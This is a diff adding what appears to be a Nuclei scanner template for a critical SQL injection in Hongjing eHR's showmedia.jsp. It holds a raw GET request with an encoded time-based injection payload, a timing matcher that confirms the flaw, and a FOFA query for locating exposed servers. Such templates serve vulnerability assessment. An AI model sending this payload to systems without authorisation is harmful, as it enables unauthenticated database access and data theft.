@@ -1,0 +1,27 @@
+http:
+- matchers:
+  - dsl:
+    - duration>=5
+    type: dsl
+  raw:
+  - '@timeout: 10s
+
+    GET /train/resource/course/showmedia.jsp?a_code&r5100=RzvoYYlxoMjNIPAATTP2HJBPAATTPGGqY4XJPloJ5D5mnYCLzn1uPAATTP2HJBPAATTPQPnPAATTP2HJBPAATTPXdzNJ8pj7I9aiWqroDzoCf
+    HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+id: hjsoft-ehr-showmedia-sqli
+info:
+  author: Co5mos
+  description: "\u5B8F\u666FeHR showmedia.jsp\u5B58\u5728SQL\u6CE8\u5165\u6F0F\u6D1E\
+    \uFF0C\u672A\u7ECF\u8FC7\u8EAB\u4EFD\u8BA4\u8BC1\u7684\u8FDC\u7A0B\u653B\u51FB\
+    \u8005\u53EF\u5229\u7528\u6B64\u6F0F\u6D1E\u6267\u884C\u4EFB\u610FSQL\u6307\u4EE4\
+    \uFF0C\u4ECE\u800C\u7A83\u53D6\u6570\u636E\u5E93\u654F\u611F\u4FE1\u606F\u3002\
+    \n"
+  metadata:
+    fofa-query: app="HJSOFT-HCM"
+  name: Hongjing eHR showmedia.jsp SQL Injection
+  severity: critical
+  tags: hjsoft,sqli
